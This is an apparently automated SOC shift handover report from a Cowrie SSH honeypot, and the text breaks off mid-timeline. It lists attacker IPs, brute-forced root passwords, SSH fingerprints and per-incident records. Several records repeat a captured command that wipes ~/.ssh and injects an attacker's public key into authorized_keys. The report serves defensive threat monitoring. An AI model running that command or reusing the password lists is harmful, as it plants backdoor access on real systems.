# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-02 |
| **Generated At** | 2026-05-02T20:49:31Z |
| **Shift Time** | 20:49 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **102** |
| Confirmed Threats | **66** |
| False Positives Filtered | **36** (35.3%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **14** |
| High Severity Cases | **32** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **70** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **57** |
| Unique Credential Pairs | **27** |
| Unique Usernames | **10** |
| Unique Passwords | **27** |
| Successful Auth Pairs | **18** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 32 |
| `345gs5662d34` | 16 |
| `user` | 2 |
| `cvsuser` | 1 |
| `debian` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 16 |
| `3245gs5662d34` | 16 |
| `cvsuser123` | 1 |
| `Qweasd!@#` | 1 |
| `4444` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `3245gs5662d34` | 16 |
| `cvsuser` | `cvsuser123` | 1 |
| `root` | `Qweasd!@#` | 1 |
| `user` | `4444` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qweasd!@#` | `157.10.253.39` | 2026-05-02T20:14:44 |
| `root` | `3245gs5662d34` | `157.10.253.39` | 2026-05-02T20:14:49 |
| `root` | `1qa2ws3ed4rf` | `171.244.37.96` | 2026-05-02T20:28:12 |
| `root` | `3245gs5662d34` | `171.244.37.96` | 2026-05-02T20:28:15 |
| `root` | `Sx123456` | `171.244.37.96` | 2026-05-02T20:29:12 |
| `root` | `Pa55w0rd!` | `171.244.37.96` | 2026-05-02T20:30:17 |
| `root` | `root@admin123` | `171.244.37.96` | 2026-05-02T20:31:19 |
| `root` | `1234&qwer` | `171.244.37.96` | 2026-05-02T20:33:16 |
| `root` | `1Qazxsw@` | `171.244.37.96` | 2026-05-02T20:34:13 |
| `root` | `terror` | `171.244.37.96` | 2026-05-02T20:35:08 |
| `root` | `Gx123456.` | `171.244.37.96` | 2026-05-02T20:36:10 |
| `root` | `321` | `171.244.37.96` | 2026-05-02T20:37:10 |
| `root` | `Asd@2026` | `171.244.37.96` | 2026-05-02T20:38:10 |
| `root` | `localAdm/1` | `171.244.37.96` | 2026-05-02T20:41:07 |
| `root` | `20042004` | `171.244.37.96` | 2026-05-02T20:42:09 |
| `root` | `ABCabc!@` | `171.244.37.96` | 2026-05-02T20:43:10 |
| `root` | `Abcde123` | `171.244.37.96` | 2026-05-02T20:44:14 |
| `root` | `R00tuser` | `171.244.37.96` | 2026-05-02T20:45:19 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **102** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 57 |
| Unknown | 2 |
| Perl Net::SSH | 1 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 57 | 3 |
| `3c0eaacec19b...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 57 | 3 | libssh-based |
| `95420f9d932d...` | Unknown | 2 | 2 | — |
| `3c0eaacec19b...` | Perl Net::SSH | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 16 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `157.10.253.39`, `171.244.37.96`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **16** |
| High-Risk ASNs | **9** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213412` | ONYPHE SAS | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | MEDIUM |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS270968` | JCFW TELECOMUNICACOES LTDA | 1 | LOW |
| `AS29256` | STE PDN Internal AS | 1 | LOW |
| `AS8376` | Jordan Data Communications Company LLC | 1 | MEDIUM |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS4713` | NTT DOCOMO BUSINESS,Inc. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (32)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c205cf153537

| Field | Detail |
|---|---|
| **Source IP** | `157.10.253[.]39` |
| **First Seen** | 2026-05-02 20:14 |
| **Last Seen** | 2026-05-02 20:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:14:42` | `cowrie.session.connect` |
| `2026-05-02 20:14:42` | `cowrie.client.version` |
| `2026-05-02 20:14:43` | `cowrie.client.kex` |
| `2026-05-02 20:14:44` | `cowrie.login.success` |
| `2026-05-02 20:14:44` | `cowrie.session.params` |
| `2026-05-02 20:14:44` | `cowrie.command.input` |
| `2026-05-02 20:14:44` | `cowrie.command.failed` |
| `2026-05-02 20:14:44` | `cowrie.log.closed` |
| `2026-05-02 20:14:45` | `cowrie.session.params` |
| `2026-05-02 20:14:45` | `cowrie.command.input` |
| `2026-05-02 20:14:45` | `cowrie.session.file_download` |
| `2026-05-02 20:14:45` | `cowrie.log.closed` |
| `2026-05-02 20:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.10.253[.]39` to AbuseIPDB if not already reported
- [ ] Block `157.10.253[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed1692125996

| Field | Detail |
|---|---|
| **Source IP** | `157.10.253[.]39` |
| **First Seen** | 2026-05-02 20:14 |
| **Last Seen** | 2026-05-02 20:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:14:48` | `cowrie.session.connect` |
| `2026-05-02 20:14:48` | `cowrie.client.version` |
| `2026-05-02 20:14:48` | `cowrie.client.kex` |
| `2026-05-02 20:14:49` | `cowrie.login.success` |
| `2026-05-02 20:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.10.253[.]39` to AbuseIPDB if not already reported
- [ ] Block `157.10.253[.]39` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-803cbee5448f

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:28 |
| **Last Seen** | 2026-05-02 20:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:28:12` | `cowrie.session.connect` |
| `2026-05-02 20:28:12` | `cowrie.client.version` |
| `2026-05-02 20:28:12` | `cowrie.client.kex` |
| `2026-05-02 20:28:12` | `cowrie.login.success` |
| `2026-05-02 20:28:12` | `cowrie.session.params` |
| `2026-05-02 20:28:12` | `cowrie.command.input` |
| `2026-05-02 20:28:12` | `cowrie.command.failed` |
| `2026-05-02 20:28:12` | `cowrie.log.closed` |
| `2026-05-02 20:28:13` | `cowrie.session.params` |
| `2026-05-02 20:28:13` | `cowrie.command.input` |
| `2026-05-02 20:28:13` | `cowrie.session.file_download` |
| `2026-05-02 20:28:13` | `cowrie.log.closed` |
| `2026-05-02 20:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45b31bd2e2c0

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:28 |
| **Last Seen** | 2026-05-02 20:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:28:14` | `cowrie.session.connect` |
| `2026-05-02 20:28:14` | `cowrie.client.version` |
| `2026-05-02 20:28:15` | `cowrie.client.kex` |
| `2026-05-02 20:28:15` | `cowrie.login.success` |
| `2026-05-02 20:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d9383de539e

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:29 |
| **Last Seen** | 2026-05-02 20:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:29:12` | `cowrie.session.connect` |
| `2026-05-02 20:29:12` | `cowrie.client.version` |
| `2026-05-02 20:29:12` | `cowrie.client.kex` |
| `2026-05-02 20:29:12` | `cowrie.login.success` |
| `2026-05-02 20:29:13` | `cowrie.session.params` |
| `2026-05-02 20:29:13` | `cowrie.command.input` |
| `2026-05-02 20:29:13` | `cowrie.command.failed` |
| `2026-05-02 20:29:13` | `cowrie.log.closed` |
| `2026-05-02 20:29:13` | `cowrie.session.params` |
| `2026-05-02 20:29:13` | `cowrie.command.input` |
| `2026-05-02 20:29:13` | `cowrie.session.file_download` |
| `2026-05-02 20:29:13` | `cowrie.log.closed` |
| `2026-05-02 20:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fb34b38a9ed

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:29 |
| **Last Seen** | 2026-05-02 20:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:29:15` | `cowrie.session.connect` |
| `2026-05-02 20:29:15` | `cowrie.client.version` |
| `2026-05-02 20:29:15` | `cowrie.client.kex` |
| `2026-05-02 20:29:15` | `cowrie.login.success` |
| `2026-05-02 20:29:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77c88ca9f638

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:30 |
| **Last Seen** | 2026-05-02 20:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:30:17` | `cowrie.session.connect` |
| `2026-05-02 20:30:17` | `cowrie.client.version` |
| `2026-05-02 20:30:17` | `cowrie.client.kex` |
| `2026-05-02 20:30:17` | `cowrie.login.success` |
| `2026-05-02 20:30:17` | `cowrie.session.params` |
| `2026-05-02 20:30:17` | `cowrie.command.input` |
| `2026-05-02 20:30:17` | `cowrie.command.failed` |
| `2026-05-02 20:30:18` | `cowrie.log.closed` |
| `2026-05-02 20:30:18` | `cowrie.session.params` |
| `2026-05-02 20:30:18` | `cowrie.command.input` |
| `2026-05-02 20:30:18` | `cowrie.session.file_download` |
| `2026-05-02 20:30:18` | `cowrie.log.closed` |
| `2026-05-02 20:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae929772087a

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:30 |
| **Last Seen** | 2026-05-02 20:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:30:20` | `cowrie.session.connect` |
| `2026-05-02 20:30:20` | `cowrie.client.version` |
| `2026-05-02 20:30:20` | `cowrie.client.kex` |
| `2026-05-02 20:30:20` | `cowrie.login.success` |
| `2026-05-02 20:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5775cb65b46e

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:31 |
| **Last Seen** | 2026-05-02 20:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:31:18` | `cowrie.session.connect` |
| `2026-05-02 20:31:18` | `cowrie.client.version` |
| `2026-05-02 20:31:18` | `cowrie.client.kex` |
| `2026-05-02 20:31:19` | `cowrie.login.success` |
| `2026-05-02 20:31:19` | `cowrie.session.params` |
| `2026-05-02 20:31:19` | `cowrie.command.input` |
| `2026-05-02 20:31:19` | `cowrie.command.failed` |
| `2026-05-02 20:31:19` | `cowrie.log.closed` |
| `2026-05-02 20:31:19` | `cowrie.session.params` |
| `2026-05-02 20:31:19` | `cowrie.command.input` |
| `2026-05-02 20:31:19` | `cowrie.session.file_download` |
| `2026-05-02 20:31:19` | `cowrie.log.closed` |
| `2026-05-02 20:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e9028b5ed61

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:31 |
| **Last Seen** | 2026-05-02 20:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:31:21` | `cowrie.session.connect` |
| `2026-05-02 20:31:21` | `cowrie.client.version` |
| `2026-05-02 20:31:21` | `cowrie.client.kex` |
| `2026-05-02 20:31:22` | `cowrie.login.success` |
| `2026-05-02 20:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ad4c2d73fcf

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:33 |
| **Last Seen** | 2026-05-02 20:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:33:15` | `cowrie.session.connect` |
| `2026-05-02 20:33:15` | `cowrie.client.version` |
| `2026-05-02 20:33:16` | `cowrie.client.kex` |
| `2026-05-02 20:33:16` | `cowrie.login.success` |
| `2026-05-02 20:33:16` | `cowrie.session.params` |
| `2026-05-02 20:33:16` | `cowrie.command.input` |
| `2026-05-02 20:33:16` | `cowrie.command.failed` |
| `2026-05-02 20:33:16` | `cowrie.log.closed` |
| `2026-05-02 20:33:16` | `cowrie.session.params` |
| `2026-05-02 20:33:16` | `cowrie.command.input` |
| `2026-05-02 20:33:17` | `cowrie.session.file_download` |
| `2026-05-02 20:33:17` | `cowrie.log.closed` |
| `2026-05-02 20:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d689f72a9998

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:33 |
| **Last Seen** | 2026-05-02 20:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:33:18` | `cowrie.session.connect` |
| `2026-05-02 20:33:18` | `cowrie.client.version` |
| `2026-05-02 20:33:18` | `cowrie.client.kex` |
| `2026-05-02 20:33:19` | `cowrie.login.success` |
| `2026-05-02 20:33:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.244.37[.]96` to AbuseIPDB if not already reported
- [ ] Block `171.244.37[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca9c8a3c247d

| Field | Detail |
|---|---|
| **Source IP** | `171.244.37[.]96` |
| **First Seen** | 2026-05-02 20:34 |
| **Last Seen** | 2026-05-02 20:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-02 20:34:13` | `cowrie.session.connect` |
| `2026-05-02 20:34:13` | `cowrie.client.version` |
| `2026-05-02 20:34:13` | `cowrie.client.kex` |
| `2026-05-02 20:34:13` | `cowrie.login.success` |
| `2026-05-02 20:34:13` | `cowrie.session.params` |
| `2026-05-02 20:34:13` | `cowrie.command.input` |
| `2026-05-02 20:34:13` | `cowrie.command.failed` |
| `2026-05-02 20:34:14` | `cowrie.log.closed` |
| `2026-05-02 20:34:14` | `cowrie.session.params` |
